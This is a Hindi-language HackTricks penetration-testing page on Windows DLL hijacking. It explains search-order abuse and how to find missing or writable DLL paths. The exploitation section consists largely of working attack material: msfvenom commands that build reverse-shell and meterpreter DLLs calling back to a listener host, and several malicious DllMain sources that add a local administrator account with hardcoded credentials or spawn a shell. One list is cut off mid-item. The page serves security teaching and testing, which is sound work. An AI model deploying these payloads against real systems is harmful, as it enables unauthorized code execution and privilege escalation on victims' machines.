# Dll हाइजैकिंग

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

अगर आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम नियुक्ति कर रहे हैं!** (_फ्लूएंट पोलिश लिखने और बोलने की आवश्यकता है_).

{% embed url="https://www.stmcyber.com/careers" %}

## मूलभूत जानकारी

DLL हाइजैकिंग में एक विश्वसनीय एप्लिकेशन को एक दुरुपयोगी DLL लोड करने में मनिपुरण करना शामिल है। यह शब्द कई तकनीकों को शामिल करता है जैसे **DLL स्पूफिंग, इंजेक्शन, और साइड-लोडिंग**। यह मुख्य रूप से कोड निष्पादन, स्थिरता प्राप्ति और, कम होते हुए, विशेषाधिकार उन्नति के लिए उपयोग किया जाता है। यहां उन्नति पर ध्यान केंद्रित होने के बावजूद, हाइजैकिंग का तरीका उद्देश्यों के अविरल रहता है।

### सामान्य तकनीकें

DLL हाइजैकिंग के लिए कई तकनीकों का उपयोग किया जाता है, प्रत्येक की प्रभावकारिता एप्लिकेशन के DLL लोडिंग रणनीति पर निर्भर करती है:

1. **DLL प्रतिस्थापन**: एक विश्वसनीय DLL को एक दुरुपयोगी से बदलना, वैकल्पिक रूप से DLL प्रॉक्सीइंग का उपयोग करके मूल DLL की कार्यक्षमता को संरक्षित करने के लिए।
2. **DLL खोज क्रम हाइजैकिंग**: विश्वसनीय एक के आगे एक खोज पथ में एक दुरुपयोगी DLL रखना, एप्लिकेशन की खोज पैटर्न का शोषण करना।
3. **फैंटम DLL हाइजैकिंग**: एक दुरुपयोगी DLL बनाना जिसे एक एप्लिकेशन लोड करेगा, सोचते हुए कि यह एक अस्तित्व नहीं रखने वाली आवश्यक DLL है।
4. **DLL पुनर्निर्देशन**: `%PATH%` या `.exe.manifest` / `.exe.local` फ़ाइलें जैसे खोज पैरामीटरों को संशोधित करके एप्लिकेशन को दुरुपयोगी DLL पर मार्गनिर्देशित करना।
5. **WinSxS DLL प्रतिस्थापन**: WinSxS निर्देशिका में विश्वसनीय DLL को एक दुरुपयोगी संबंधित विकल्प से प्रतिस्थापित करना, एक विधि जिसे अक्सर DLL साइड-लोडिंग के साथ जोड़ा जाता है।
6. **सापेक्ष पथ DLL हाइजैकिंग**: उपयोक्ता नियंत्रित निर्देशिका में दुरुपयोगी DLL रखना, कॉपी की गई एप्लिकेशन के साथ, बाइनरी प्रॉक्सी निष्पादन तकनीकों की तरह।


## गायब Dlls खोजना

सिस्टम में गायब Dlls खोजने का सबसे सामान्य तरीका [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) को सिस्टम से चलाना है, **निम्नलिखित 2 फ़िल्टर सेट करना**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

और बस **फ़ाइल सिस्टम गतिविधि** दिखाना:

![](<../../.gitbook/assets/image (314).png>)

यदि आप **सामान्य में गायब dlls खोज रहे हैं** तो आपको कुछ **सेकंड के लिए इसे चलने दें**।\
यदि आप **किसी विशेष executable में गायब dll खोज रहे हैं** तो आपको **"प्रोसेस नाम" "शामिल है" "<exec नाम>" जैसा एक और फ़िल्टर सेट करना चाहिए, इसे चलाना और घटनाओं को रोकना**।

## गायब Dlls का शोषण

विशेषाधिकारों को उन्नत करने के लिए, हमारे पास सबसे अच्छा मौका है कि **हम एक dll लिख सकें जिसे एक विशेषाधिकार प्रक्रिया लोड करने की कोशिश करेगी** किसी **ऐसे स्थान पर लिख सकें** जहां यह **खोजा जाएगा**। इसलिए, हमें **एक** ऐसे **फ़ोल्डर में एक dll लिखने की स्वतंत्रता होगी** जहां **मूल dll से पहले खोजी जाएगी** (अजीब मामला), या हमें **एक फ़ोल्डर पर लिखने की स्वतंत्रता होगी** जहां dll की खोज की जाएगी और मूल **dll किसी भी फ़ोल्डर में मौजूद नहीं है**।

### Dll खोज क्रम

**माइक्रोसॉफ्ट दस्तावेज़ी** [**में**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **आप विशेष रूप से कैसे Dlls लोड किए जाते हैं, यहाँ देख सकते हैं।**

**Windows एप्लिकेशन** एक विशिष्ट क्रमानुसार एक सेट के साथ DLLs की खोज करते हैं। DLL हाइजैकिंग की समस्या उत्पन्न होती है जब एक हानिकारक DLL इन निर्देशिकाओं में से एक में रणनीतिक रूप से रखा जाता है, यह सुनिश्चित करता है कि यह मूल DLL से पहले लोड होता है। इसे रोकने का एक समाधान यह है कि एप्लिकेशन को यह सुनिश्चित करना चाहिए कि वह उस DLL को जिसकी आवश्यकता है को संदर्भित करते समय पूर्ण पथ का उपयोग करता है।

आप **32-बिट पर** DLL खोज क्रम नीचे देख सकते हैं:

1. एप्लिकेशन जिससे लोड किया गया है निर्देशिका।
2. सिस्टम निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) फ़ंक्शन का उपयोग करें।(_C:\Windows\System32_)
3. 16-बिट सिस्टम निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए कोई फ़ंक्शन नहीं है, लेकिन यह खोजा जाता है। (_C:\Windows\System_)
4. Windows निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) फ़ंक्शन का उपयोग करें।
1. (_C:\Windows_)
5. वर्तमान निर्देशिका।
6. PATH पर्यावरण चरण
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **पथ के सभी फ़ोल्डरों की अनुमतियों की जाँच करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप एक executable के imports और एक dll के exports की जाँच भी कर सकते हैं:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
एक पूर्ण मार्गदर्शिका के लिए **Dll Hijacking का दुरुपयोग करके विशेषाधिकारों को उन्नत करने** के लिए जाँच करें जिसमें **सिस्टम पथ फ़ोल्डर** में लिखने की अनुमति है:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### स्वचालित उपकरण

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)यह जांचेगा कि क्या आपके पास सिस्टम PATH के किसी भी फ़ोल्डर में लेखन की अनुमति है।\
इस वंशनीयता को खोजने के लिए अन्य दिलचस्प स्वचालित उपकरण हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आप एक उत्पादनीय स्थिति पाते हैं तो इसे सफलतापूर्वक उत्पादित करने के लिए सबसे महत्वपूर्ण चीजों में से एक होगा **एक dll बनाना जो कम से कम सभी फ़ंक्शन्स को निर्यात करता है जिन्हें एक्जीक्यूटेबल इससे आयात करेगा**। फिर भी, ध्यान दें कि Dll Hijacking मध्यम अभिगति स्तर से उच्च **(UAC को छलकर)** में से उन्नति के लिए उपयुक्त है या **सिस्टम से उच्च अभिगति से**](./#from-high-integrity-to-system)**।** आप एक मान्य dll बनाने का उदाहरण इस dll हाइजैकिंग अध्ययन में पा सकते हैं जिस पर ध्यान केंद्रित है dll हाइजैकिंग के लिए: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**।**\
इसके अतिरिक्त, **अगले खंड** में आपको कुछ **मूल dll कोड** मिलेगा जो **नमूने** के रूप में उपयोगी हो सकते हैं या **एक dll बनाने के लिए** जिसमें **अनावश्यक फ़ंक्शन्स निर्यात किए गए हों**।

## **Dlls बनाना और कंपाइल करना**

### **Dll Proxifying**

मूल रूप से एक **Dll प्रॉक्सी** एक Dll है जो **जब लोड होता है तो आपके दुरुपयोगी कोड को निष्पादित करने में सक्षम है** लेकिन यह भी **उसी प्रकार से व्यवहार करता है** जैसे कि **वास्तविक पुस्तकालय को सभी कॉल को रील लाइब्रेरी को रिले करके**।

उपकरण [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) आप वास्तविक लाइब्रेरी को प्रॉक्सीफ़ाई करने के लिए एक एक्जीक्यूटेबल और लाइब्रेरी का चयन कर सकते हैं और **प्रॉक्सीफ़ाईड dll उत्पन्न** कर सकते हैं या **Dll को चिह्नित करें** और **प्रॉक्सीफ़ाईड dll उत्पन्न** कर सकते हैं।

### **Meterpreter**

**गेट रेव शैल (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**मीटरप्रेटर प्राप्त करें (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 मैंने x64 संस्करण नहीं देखा):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में वह Dll जिसे आप कंपाइल करते हैं, **कई फ़ंक्शन निर्यात करना चाहिए** जो पीड़ित प्रक्रिया द्वारा लोड किए जाएंगे, यदि ये फ़ंक्शन मौजूद नहीं हैं तो **बाइनरी उन्हें लोड करने में सक्षम नहीं होगी** और **उत्पीड़न विफल हो जाएगा**।
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## संदर्भ
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अनहैकेबल को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_फ्लूएंट पोलिश लिखित और बोली जानी चाहिए_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का **विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** हैकट्रिक्स और हैकट्रिक्स क्लाउड github रेपो में PR जमा करके।

</details>
